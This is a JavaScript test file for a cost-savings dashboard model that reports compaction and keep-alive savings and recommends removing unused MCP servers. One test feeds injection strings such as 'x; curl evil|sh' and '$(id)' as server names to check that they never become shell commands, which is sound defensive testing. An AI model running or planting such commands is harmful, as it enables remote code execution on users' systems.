// Pure models behind the bottom line (ui/bottomline.js). node --test dash/bottomline.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
const BL = createRequire(import.meta.url)('./ui/bottomline.js');

const o = { accounting: { complete: 100 }, requests: 100, cost_usd: 90, cg_llm_cost_usd: 1, keepalive_ping_usd: 2,
  net_saved_usd: 5, keepalive_net_usd: 3, cachesplit_saved_usd: 0.5, total_saved_usd: 8.5, cache_read: 80, cache_write: 15, fresh_input: 5 };

test('overview: one net, receipt reconciles to the server total', () => {
  const m = BL.ovModel(o);
  assert.equal(m.number, 'up to $8.50');
  assert.match(m.sentence, /estimated \$5\.50 net from compaction, plus up to \$3\.00 from keep-alive \(a ceiling, not measured\).*9\.1% of your \$93\.00 bill/);
  const ka = m.rows.find((r) => r.label.startsWith('Keep-alive'));
  assert.equal(ka.badge, 'Upper bound'); assert.match(ka.note, /ceiling/);
  assert.ok(m.rows.every((r) => r.label !== 'Other (declarations dropped)'), 'no plug row when the remainder is zero');
  // No keep-alive credit: plain estimate, no upper-bound wording.
  const nk = BL.ovModel({ ...o, keepalive_net_usd: 0, total_saved_usd: 5.5 });
  assert.equal(nk.number, '$5.50'); assert.doesNotMatch(nk.sentence, /up to|ceiling/);
  assert.equal(m.badge, 'Estimated');
  const sum = m.rows.reduce((s, r) => s + r.usd, 0);
  assert.ok(Math.abs(sum - o.total_saved_usd) < 1e-9, 'receipt rows must add up to total_saved_usd');
  assert.ok(m.rows.some((r) => r.label.includes('own model spend') && r.badge === 'Observed' && r.usd === -1));
});
test('overview: negative total says so; unpriced says unknown, never $0', () => {
  assert.match(BL.ovModel({ ...o, total_saved_usd: -2, net_saved_usd: -2, keepalive_net_usd: 0, cachesplit_saved_usd: 0 }).sentence, /cost you \$2\.00 more/);
  const u = BL.ovModel({ ...o, accounting: { complete: 0 } });
  assert.equal(u.number, 'unknown'); assert.equal(u.badge, 'Unpriced');
});
test('inventory: only fully unused servers, biggest first, with the removal command', () => {
  const m = BL.invModel({ totals: { priced: true, unused_usd: 30, unused_tokens: 90, declared_tokens: 100 },
    servers: [{ server: 'a', tools: 3, tools_used: 0, unused_usd: 5, sessions_declared: 4 },
      { server: 'b', tools: 3, tools_used: 1, unused_usd: 9, sessions_declared: 4 },
      { server: 'c', tools: 3, tools_used: 0, unused_usd: 12, sessions_declared: 4 }] });
  assert.deepEqual(m.recs.map((r) => r.command), ['claude mcp remove c', 'claude mcp remove a']);
});
test('inventory: a server name that is not a plain identifier never becomes a shell command', () => {
  const m = BL.invModel({ totals: { priced: true }, servers: [{ server: 'x; curl evil|sh', tools: 1, tools_used: 0, unused_usd: 1, sessions_declared: 1 },
    { server: '$(id)', tools: 1, tools_used: 0, unused_usd: 1, sessions_declared: 1 }] });
  assert.deepEqual(m.recs.map((r) => r.command), ['', '']);
});
test('overview: a remainder shows as Other and keeps the receipt reconciled', () => {
  const m = BL.ovModel({ ...o, total_saved_usd: 10 });
  assert.ok(m.rows.some((r) => r.label === 'Other (declarations dropped)' && Math.abs(r.usd - 1.5) < 1e-9));
  assert.ok(Math.abs(m.rows.reduce((s, r) => s + r.usd, 0) - 10) < 1e-9);
});
test('keep-alive: decision interval first; negative interval does not recommend pings', () => {
  const good = BL.kaModel({ n: 5, lo_usd: 2, hi_usd: 4, idle_seconds: 280, max_pings: 2 }, { net_usd: 1, ping_usd: 0.5 });
  assert.equal(good.number, '$2.00 to $4.00'); assert.equal(good.recs.length, 1);
  const bad = BL.kaModel({ n: 5, lo_usd: -3, hi_usd: -1, idle_seconds: 280, max_pings: 2 }, null);
  assert.match(bad.sentence, /not expected to pay/); assert.equal(bad.recs.length, 0);
  assert.match(good.observed, /ceiling.*upper bound, not a measurement/); assert.doesNotMatch(good.observed, /upper bound \(Observed\)/);
  assert.equal(good.recs[0].usd, 2, 'ranks on the low bound, not the ceiling');
});
test('rank: by dollars, max three', () => {
  assert.deepEqual(BL.rank([{ usd: 1 }, { usd: 9 }], [{ usd: 5 }, { usd: 3 }]).map((r) => r.usd), [9, 5, 3]);
});
